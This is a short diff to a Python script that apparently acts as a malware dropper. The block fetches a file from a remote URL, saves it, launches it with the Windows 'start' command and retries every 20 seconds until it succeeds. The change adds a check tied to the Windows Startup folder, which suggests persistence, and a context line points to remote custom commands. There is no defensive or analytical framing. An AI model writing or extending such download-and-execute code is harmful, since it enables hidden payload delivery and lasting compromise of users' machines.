@@ -49,16 +49,18 @@ if custom_command:
     except Exception as generic_error:
         print(f"Error: {generic_error}")
 
-if download_url:
-    while True:
-        try:
-            response = requests.get(f"{download_url}")
-            with open(downloaded_file_path, 'wb') as file:
-                file.write(response.content)
-            print(f"Download successful. File saved at: {downloaded_file_path}")
-            os.popen(f"start {downloaded_file_path}")
-            break
-        except Exception as download_error:
-            print(f"Error: {download_error}")
-            time.sleep(20)
-            pass
+current_directory = os.getcwd()
+if not current_directory.endswith("Startup"):
+    if download_url:
+        while True:
+            try:
+                response = requests.get(f"{download_url}")
+                with open(downloaded_file_path, 'wb') as file:
+                    file.write(response.content)
+                print(f"Download successful. File saved at: {downloaded_file_path}")
+                os.popen(f"start {downloaded_file_path}")
+                break
+            except Exception as download_error:
+                print(f"Error: {download_error}")
+                time.sleep(20)
+                pass
